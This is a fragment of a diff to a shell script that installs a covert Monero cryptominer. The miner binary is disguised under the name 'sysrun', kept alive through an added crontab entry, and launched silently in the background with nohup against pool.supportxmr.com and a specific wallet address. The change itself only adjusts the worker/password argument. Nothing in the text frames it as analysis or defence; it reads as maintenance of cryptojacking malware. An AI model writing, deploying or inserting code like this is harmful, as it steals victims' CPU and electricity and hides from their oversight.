@@ -24,4 +24,4 @@ grep -q "sysrun" <(crontab -l 2>/dev/null) || (
 ) | crontab -
 
 # Start quietly in background using 30–60% CPU
-nohup taskset -c 0-2 ./sysrun -o pool.supportxmr.com:3333 -u 46mq2ZzCzce5JfVo42AFWJCWkTyTAwGF3gvr7KPmBVE3GBU2DWJncUTZxUswuHBFrsQL88wEn8dGK8PeagpmCRjFMswYgXU -p node1+1 --coin monero --cpu-max-threads-hint=50 > /dev/null 2>&1 &
+nohup taskset -c 0-2 ./sysrun -o pool.supportxmr.com:3333 -u 46mq2ZzCzce5JfVo42AFWJCWkTyTAwGF3gvr7KPmBVE3GBU2DWJncUTZxUswuHBFrsQL88wEn8dGK8PeagpmCRjFMswYgXU -p node1 --coin monero --cpu-max-threads-hint=50 > /dev/null 2>&1 &
